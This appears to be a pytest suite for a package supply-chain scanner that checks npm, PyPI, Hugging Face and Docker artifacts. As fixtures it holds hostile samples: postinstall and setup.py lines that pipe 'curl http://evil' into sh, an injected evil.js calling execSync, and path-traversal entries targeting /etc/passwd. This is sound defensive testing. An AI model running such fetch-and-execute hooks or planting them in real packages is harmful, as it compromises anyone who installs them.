"""Phase 2 — published-artifact fetch + scan + repo↔artifact drift (all offline).

Canned in-memory tarball/wheel fixtures + httpx MockTransport, so no network is
hit. Covers: SSRF host-allowlist + redirect refusal, size/zip-bomb/zip-slip guards,
npm + PyPI resolve/download/unpack, install-hook detection (npm lifecycle + setup.py
AST), repo↔artifact drift, and the fail-open orchestrator.
"""
from __future__ import annotations

import io
import json
import tarfile
import zipfile

import httpx
import pytest

from src.scanner import artifact_fetch as af
from src.scanner.artifact_fetch import (
    ArtifactFetchError,
    _unpack_tar_gz,
    _unpack_zip,
    _validate_registry_url,
    fetch_npm_artifact,
    fetch_pypi_artifact,
)
from src.scanner.artifact_scan import (
    detect_pypi_install_exec,
    scan_published_artifact,
)

# ── fixture builders ─────────────────────────────────────────────────────────

def _make_targz(members: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _make_zip(members: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


def _mock_client(handler):
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


# ── SSRF host allowlist + redirect refusal ───────────────────────────────────

def test_registry_url_rejects_non_allowlisted_host():
    # Public IP literal → passes the SSRF private-range guard, but not allowlisted.
    with pytest.raises(ArtifactFetchError):
        _validate_registry_url("https://93.184.216.34/evil.tgz")


def test_registry_url_rejects_http_scheme():
    with pytest.raises(ValueError):
        _validate_registry_url("http://registry.npmjs.org/x")  # not https


def test_registry_url_accepts_allowlisted():
    assert _validate_registry_url(
        "https://files.pythonhosted.org/packages/x/pkg-1.0.tar.gz"
    )


@pytest.mark.asyncio
async def test_download_refuses_redirect():
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(302, headers={"location": "https://evil.example/x"})

    async with _mock_client(handler) as client:
        with pytest.raises(ArtifactFetchError):
            await af._download("https://registry.npmjs.org/x.tgz", client)


# ── size / zip-bomb / zip-slip guards ─────────────────────────────────────────

def test_unpack_strips_package_prefix_and_classifies():
    raw = _make_targz({
        "package/index.js": b"console.log(1)",
        "package/logo.png": b"\x89PNG\x00\x01binary",  # NUL → binary
    })
    files = af._build_file_map(_unpack_tar_gz(raw))
    assert "index.js" in files and "logo.png" in files  # package/ stripped
    assert files["index.js"].text == "console.log(1)"
    assert files["index.js"].is_binary is False
    assert files["logo.png"].is_binary is True
    assert files["logo.png"].text is None


def test_unpack_rejects_path_traversal():
    raw = _make_targz({"package/../../etc/passwd": b"x"})
    with pytest.raises(ArtifactFetchError):
        _unpack_tar_gz(raw)


def test_unpack_rejects_absolute_path_in_zip():
    raw = _make_zip({"/etc/shadow": b"x"})
    with pytest.raises(ArtifactFetchError):
        _unpack_zip(raw)


def test_unpack_enforces_per_file_cap(monkeypatch):
    monkeypatch.setattr(af, "MAX_MEMBER_BYTES", 8)
    raw = _make_targz({"package/big.js": b"0123456789"})  # 10 bytes > 8
    with pytest.raises(ArtifactFetchError):
        _unpack_tar_gz(raw)


def test_unpack_enforces_file_count_cap(monkeypatch):
    monkeypatch.setattr(af, "MAX_FILE_COUNT", 1)
    raw = _make_targz({"package/a.js": b"a", "package/b.js": b"b"})
    with pytest.raises(ArtifactFetchError):
        _unpack_tar_gz(raw)


def test_unpack_enforces_unpacked_size_cap(monkeypatch):
    monkeypatch.setattr(af, "MAX_UNPACKED_BYTES", 5)
    raw = _make_targz({"package/a.js": b"012345"})  # 6 > 5
    with pytest.raises(ArtifactFetchError):
        _unpack_tar_gz(raw)


@pytest.mark.asyncio
async def test_download_enforces_size_cap(monkeypatch):
    monkeypatch.setattr(af, "MAX_DOWNLOAD_BYTES", 4)

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, content=b"way too many bytes")

    async with _mock_client(handler) as client:
        with pytest.raises(ArtifactFetchError):
            await af._download("https://registry.npmjs.org/x.tgz", client)


# ── npm resolve + fetch + unpack ──────────────────────────────────────────────

def _npm_handler(name: str, version: str, tarball: bytes):
    tarball_url = f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz"

    def handler(request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path == f"/{name}":
            return httpx.Response(200, json={
                "dist-tags": {"latest": version},
                "versions": {version: {
                    "name": name, "version": version,
                    "dist": {"tarball": tarball_url},
                }},
            })
        if path == f"/{name}/-/{name}-{version}.tgz":
            return httpx.Response(200, content=tarball)
        return httpx.Response(404)

    return handler


@pytest.mark.asyncio
async def test_fetch_npm_artifact_happy_path():
    tarball = _make_targz({
        "package/package.json": json.dumps({
            "name": "demo", "version": "1.0.0",
            "scripts": {"postinstall": "node -e \"require('http')\""},
        }).encode(),
        "package/index.js": b"module.exports = 1",
    })
    async with _mock_client(_npm_handler("demo", "1.0.0", tarball)) as client:
        res = await fetch_npm_artifact("demo", None, client=client)
    assert res.ok is True
    assert res.kind == "tarball"
    assert res.digest.startswith("sha256:")
    assert res.packaged_manifest["name"] == "demo"
    assert "index.js" in res.files


# ── PyPI resolve + fetch (sdist + wheel) ──────────────────────────────────────

@pytest.mark.asyncio
async def test_fetch_pypi_sdist_happy_path():
    sdist = _make_targz({
        "demo-1.0/setup.py": b"from setuptools import setup\nsetup(name='demo')\n",
        "demo-1.0/demo/__init__.py": b"x = 1\n",
    })
    url = "https://files.pythonhosted.org/packages/aa/demo-1.0.tar.gz"

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/pypi/demo/json":
            return httpx.Response(200, json={
                "info": {"version": "1.0"},
                "urls": [{"packagetype": "sdist", "url": url}],
            })
        if request.url.host == "files.pythonhosted.org":
            return httpx.Response(200, content=sdist)
        return httpx.Response(404)

    async with _mock_client(handler) as client:
        res = await fetch_pypi_artifact("demo", None, client=client)
    assert res.ok is True
    assert res.kind == "sdist"
    assert "setup.py" in res.files  # demo-1.0/ prefix stripped
    assert "demo/__init__.py" in res.files


@pytest.mark.asyncio
async def test_fetch_pypi_wheel_when_no_sdist():
    wheel = _make_zip({
        "demo/__init__.py": b"y = 2\n",
        "demo-1.0.dist-info/METADATA": b"Name: demo\n",
    })
    url = "https://files.pythonhosted.org/packages/bb/demo-1.0-py3-none-any.whl"

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/pypi/demo/1.0/json":
            return httpx.Response(200, json={
                "info": {"version": "1.0"},
                "urls": [{"packagetype": "bdist_wheel", "url": url}],
            })
        if request.url.host == "files.pythonhosted.org":
            return httpx.Response(200, content=wheel)
        return httpx.Response(404)

    async with _mock_client(handler) as client:
        res = await fetch_pypi_artifact("demo", "1.0", client=client)
    assert res.ok is True
    assert res.kind == "wheel"
    assert "demo/__init__.py" in res.files


# ── setup.py install-time exec (AST) ──────────────────────────────────────────

def test_setup_py_os_system_is_high():
    src = "import os\nfrom setuptools import setup\nos.system('echo hi')\nsetup(name='x')\n"
    findings = detect_pypi_install_exec(src, "setup.py")
    assert len(findings) == 1
    assert findings[0].category == "install_hook"
    assert findings[0].severity == "high"


def test_setup_py_network_plus_exec_is_critical():
    src = (
        "import os\nfrom urllib.request import urlopen\n"
        "urlopen('http://x/y')\nos.system('sh')\n"
    )
    findings = detect_pypi_install_exec(src, "setup.py")
    assert findings and findings[0].severity == "critical"


def test_setup_py_cmdclass_flagged_medium():
    src = (
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class C(install):\n    pass\n"
        "setup(name='x', cmdclass={'install': C})\n"
    )
    findings = detect_pypi_install_exec(src, "setup.py")
    assert findings and findings[0].severity == "medium"


def test_setup_py_clean_no_findings():
    src = "from setuptools import setup\nsetup(name='x', version='1.0')\n"
    assert detect_pypi_install_exec(src, "setup.py") == []


def test_setup_py_syntax_error_fails_open():
    assert detect_pypi_install_exec("def (:::", "setup.py") == []


# ── end-to-end orchestrator: poisoned tarball vs clean repo ──────────────────

@pytest.mark.asyncio
async def test_scan_published_artifact_detects_drift_and_hook():
    # Repo has index.js + package.json; the published tarball ALSO ships evil.js
    # (injected) and a dangerous postinstall hook — the poisoned-tarball attack.
    tarball = _make_targz({
        "package/package.json": json.dumps({
            "name": "demo", "version": "1.0.0",
            "scripts": {"postinstall": "curl http://evil/x | sh"},
        }).encode(),
        "package/index.js": b"module.exports = 1",
        "package/evil.js": b"eval(require('child_process').execSync('id'))",
    })
    repo_paths = {"index.js", "package.json"}

    async with _mock_client(_npm_handler("demo", "1.0.0", tarball)) as client:
        res = await scan_published_artifact(
            "npm", "demo", None, repo_paths=repo_paths, client=client,
        )
    assert res.ok is True
    assert res.digest and res.digest.startswith("sha256:")
    assert res.registry_snapshot  # pinned for recompute
    # drift: evil.js is artifact-only
    assert "evil.js" in res.drift["added_files"]
    assert res.drift["has_install_hook"] is True
    cats = {f.category for f in res.findings}
    assert "install_hook" in cats     # npm postinstall lifecycle hook
    assert "artifact_drift" in cats    # injected file + hook drift
    # the injected file's eval is caught by the reused 12-category engine
    assert any(f.category in ("unsafe_exec", "dynamic_remote_load") for f in res.findings)


@pytest.mark.asyncio
async def test_scan_published_artifact_modified_file_drift():
    tarball = _make_targz({
        "package/package.json": b'{"name":"demo","version":"1.0.0"}',
        "package/index.js": b"DIFFERENT CONTENT",
    })
    # repo hash for index.js differs from the artifact's content → modified drift
    import hashlib
    repo_hashes = {"index.js": hashlib.sha256(b"ORIGINAL").hexdigest()}

    async with _mock_client(_npm_handler("demo", "1.0.0", tarball)) as client:
        res = await scan_published_artifact(
            "npm", "demo", None,
            repo_paths={"index.js", "package.json"},
            repo_text_hashes=repo_hashes, client=client,
        )
    assert res.ok is True
    assert "index.js" in res.drift["modified_files"]


@pytest.mark.asyncio
async def test_scan_published_artifact_noncorresponding_tree_no_false_drift():
    # Package published from a monorepo subdir: no artifact path matches the repo
    # tree → comparison is inconclusive, NOT a storm of false "added" findings.
    tarball = _make_targz({
        "package/package.json": b'{"name":"demo","version":"1.0.0"}',
        "package/index.js": b"module.exports = 1",
    })
    async with _mock_client(_npm_handler("demo", "1.0.0", tarball)) as client:
        res = await scan_published_artifact(
            "npm", "demo", None,
            repo_paths={"packages/demo/src/foo.ts", "README.md"}, client=client,
        )
    assert res.ok is True
    assert res.drift["compared"] is False
    assert res.drift["added_files"] == []
    assert not any(f.category == "artifact_drift"
                   and f.name.startswith("Published artifact ships")
                   for f in res.findings)


# ── fail-open ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_scan_published_artifact_unknown_ecosystem_fails_open():
    res = await scan_published_artifact("cargo", "x", "1.0")
    assert res.ok is False
    assert res.error


@pytest.mark.asyncio
async def test_scan_published_artifact_fetch_error_fails_open():
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(404)

    async with _mock_client(handler) as client:
        res = await scan_published_artifact("npm", "nope", "1.0", client=client)
    assert res.ok is False
    assert res.error
    assert res.findings == []


# --- Validation fixes: guard-aware setup.py, benign version-exec, test-file skip,
#     precise cmdclass, drift-only-when-compared ---------------------------------
import hashlib as _hashlib  # noqa: E402

from src.scanner.artifact_fetch import ArtifactFetchResult, ArtifactFile  # noqa: E402
from src.scanner.artifact_scan import compute_drift, scan_artifact_files  # noqa: E402


def _af(path: str, text: str) -> ArtifactFile:
    raw = text.encode()
    return ArtifactFile(
        path=path, size=len(raw), sha256=_hashlib.sha256(raw).hexdigest(),
        text=text, text_sha256=_hashlib.sha256(raw).hexdigest(), is_binary=False,
    )


def test_setup_py_guarded_publish_not_install_hook():
    src = (
        "import os, sys\n"
        "if sys.argv[-1] == 'publish':\n    os.system('twine upload dist/*')\n    sys.exit()\n"
        "setup(name='x')\n"
    )
    assert detect_pypi_install_exec(src, "setup.py") == []


def test_setup_py_name_main_guard_not_install_hook():
    src = "import os\nif __name__ == '__main__':\n    os.system('echo build')\n"
    assert detect_pypi_install_exec(src, "setup.py") == []


def test_setup_py_version_exec_is_benign():
    src = (
        "about = {}\n"
        "with open('pkg/__about__.py') as f:\n    exec(f.read(), about)\n"
        "setup(name='x', version=about['__version__'])\n"
    )
    assert detect_pypi_install_exec(src, "setup.py") == []


def test_setup_py_unconditional_os_system_still_flagged():
    src = "import os\nos.system('curl http://evil | sh')\nsetup(name='x')\n"
    fs = detect_pypi_install_exec(src, "setup.py")
    assert fs and fs[0].severity == "high" and fs[0].category == "install_hook"


def test_setup_py_toplevel_urlopen_is_critical():
    src = "from urllib.request import urlopen\nurlopen('http://evil/x').read()\n"
    fs = detect_pypi_install_exec(src, "setup.py")
    assert fs and fs[0].severity == "critical"


def test_setup_py_cmdclass_test_only_not_flagged():
    src = "setup(name='x', cmdclass={'test': PyTest})\n"
    assert detect_pypi_install_exec(src, "setup.py") == []


def test_artifact_scan_skips_test_files():
    fetched = ArtifactFetchResult(
        ecosystem="pypi", name="x", version="1.0", kind="sdist", ok=True,
        files={
            "tests/test_x.py": _af(
                "tests/test_x.py", "import pickle\npickle.load(open('x', 'rb'))\n",
            ),
            "pkg/core.py": _af("pkg/core.py", "def add(a, b):\n    return a + b\n"),
        },
    )
    findings, _scanned, _hook = scan_artifact_files(fetched)
    assert not any("test" in (f.file_path or "") for f in findings)


def test_drift_no_hook_finding_when_uncompared():
    fetched = ArtifactFetchResult(
        ecosystem="npm", name="x", version="1.0", kind="tarball", ok=True,
        files={"index.js": _af("index.js", "module.exports = 1\n")},
    )
    drift, findings = compute_drift(fetched, None, None, has_install_hook=True)
    assert drift["compared"] is False
    assert findings == []


# ── Hugging Face model surface ────────────────────────────────────────────────

from src.scanner.artifact_fetch import fetch_huggingface_artifact  # noqa: E402
from src.scanner.artifact_scan import huggingface_weight_findings  # noqa: E402


def _hf_result(unsafe, safe):
    return ArtifactFetchResult(
        ecosystem="huggingface", name="org/m", version="main", kind="model", ok=True,
        packaged_manifest={"hf": {"unsafe_weights": unsafe, "safe_weights": safe}},
    )


def test_hf_pickle_only_is_high():
    f = huggingface_weight_findings(_hf_result(["pytorch_model.bin"], []))
    assert len(f) == 1
    assert f[0].category == "insecure_deserialization"
    assert f[0].severity == "high"  # no safetensors alternative


def test_hf_pickle_with_safetensors_is_medium():
    f = huggingface_weight_findings(
        _hf_result(["pytorch_model.bin"], ["model.safetensors"])
    )
    assert len(f) == 1
    assert f[0].severity == "medium"  # a safe copy exists


def test_hf_safetensors_only_is_clean():
    assert huggingface_weight_findings(_hf_result([], ["model.safetensors"])) == []


def test_hf_findings_tolerates_missing_manifest():
    r = ArtifactFetchResult(ecosystem="huggingface", name="x", version="1", kind="model", ok=True)
    assert huggingface_weight_findings(r) == []


@pytest.mark.asyncio
async def test_fetch_huggingface_artifact_happy_path():
    def handler(request: httpx.Request) -> httpx.Response:
        p = request.url.path
        if p == "/api/models/org/m":
            return httpx.Response(200, json={
                "sha": "a" * 40, "downloads": 1234, "likes": 7,
                "pipeline_tag": "text-generation", "tags": ["pytorch"],
            })
        if p == "/api/models/org/m/tree/main":
            return httpx.Response(200, json=[
                {"type": "file", "path": "config.json", "size": 40},
                {"type": "file", "path": "README.md", "size": 20},
                {"type": "file", "path": "pytorch_model.bin", "size": 5_000_000},
                {"type": "file", "path": "model.safetensors", "size": 5_000_000},
            ])
        if p == "/org/m/resolve/main/config.json":
            return httpx.Response(200, content=b'{"model_type": "gpt2"}')
        if p == "/org/m/resolve/main/README.md":
            return httpx.Response(200, content=b"# demo model")
        return httpx.Response(404)

    async with _mock_client(handler) as client:
        res = await fetch_huggingface_artifact("org/m", client=client)
    assert res.ok is True
    assert res.ecosystem == "huggingface"
    assert res.digest.startswith("sha256:")  # content digest, not the git sha1
    assert "config.json" in res.files
    hf = res.packaged_manifest["hf"]
    assert hf["unsafe_weights"] == ["pytorch_model.bin"]
    assert hf["safe_weights"] == ["model.safetensors"]
    assert hf["downloads"] == 1234


# ── Container (Docker) config surface ─────────────────────────────────────────

from src.scanner.artifact_fetch import (  # noqa: E402
    fetch_docker_artifact,
    parse_docker_coordinate,
)
from src.scanner.artifact_scan import docker_config_findings  # noqa: E402


def _docker_result(config, created=None):
    return ArtifactFetchResult(
        ecosystem="docker", name="x", version="latest", kind="image", ok=True,
        packaged_manifest={"docker": {"config": config, "created": created}},
    )


def test_docker_coordinate_official_and_ghcr():
    assert parse_docker_coordinate("nginx", None) == (
        "https://registry-1.docker.io", "library/nginx", "latest", "nginx")
    assert parse_docker_coordinate("bitnami/redis", "7") == (
        "https://registry-1.docker.io", "bitnami/redis", "7", "bitnami/redis")
    reg, repo, tag, disp = parse_docker_coordinate("ghcr.io/owner/app:1.2", None)
    assert reg == "https://ghcr.io" and repo == "owner/app" and tag == "1.2"


def test_docker_root_user_is_flagged():
    f = docker_config_findings(_docker_result({"User": ""}))
    assert any(x.category == "fs_access" and "root" in x.name.lower() for x in f)


def test_docker_nonroot_user_is_clean():
    f = docker_config_findings(_docker_result({"User": "1001"}))
    assert not any("root" in x.name.lower() for x in f)


def test_docker_secret_in_env_is_high():
    f = docker_config_findings(_docker_result(
        {"User": "app", "Env": ["PATH=/usr/bin", "AWS_SECRET_ACCESS_KEY=AKIAsecretvalue123"]}
    ))
    secret = [x for x in f if x.category == "secret"]
    assert secret and secret[0].severity == "high"


def test_docker_secret_placeholder_is_ignored():
    f = docker_config_findings(_docker_result(
        {"User": "app", "Env": ["DB_PASSWORD=${DB_PASSWORD}", "API_TOKEN=changeme"]}
    ))
    assert not any(x.category == "secret" for x in f)


def test_docker_findings_tolerates_missing_manifest():
    r = ArtifactFetchResult(ecosystem="docker", name="x", version="1", kind="image", ok=True)
    assert docker_config_findings(r) == []


@pytest.mark.asyncio
async def test_fetch_docker_artifact_happy_path():
    import hashlib as _h
    config_blob = json.dumps({
        "created": "2020-01-01T00:00:00Z",
        "os": "linux", "architecture": "amd64",
        "config": {"User": "", "Env": ["PATH=/usr/bin"], "ExposedPorts": {"80/tcp": {}}},
        "history": [{}, {}],
    }).encode()
    cfg_digest = "sha256:" + _h.sha256(config_blob).hexdigest()
    manifest = json.dumps({
        "schemaVersion": 2, "config": {"digest": cfg_digest},
        "layers": [{"digest": "sha256:aa"}, {"digest": "sha256:bb"}],
    }).encode()

    def handler(request: httpx.Request) -> httpx.Response:
        p = request.url.path
        if p == "/token":
            return httpx.Response(200, json={"token": "tok"})
        if p == "/v2/library/nginx/manifests/latest":
            return httpx.Response(200, content=manifest)
        if p == f"/v2/library/nginx/blobs/{cfg_digest}":
            return httpx.Response(200, content=config_blob)
        return httpx.Response(404)

    async with _mock_client(handler) as client:
        res = await fetch_docker_artifact("nginx", client=client)
    assert res.ok is True
    assert res.ecosystem == "docker"
    assert res.digest == cfg_digest
    d = res.packaged_manifest["docker"]
    assert d["layer_count"] == 2
    assert d["config"]["User"] == ""
    # config-level detector fires on the root user + stale base
    findings = docker_config_findings(res)
    assert any(x.category == "fs_access" for x in findings)
    assert any("months" in x.name for x in findings)
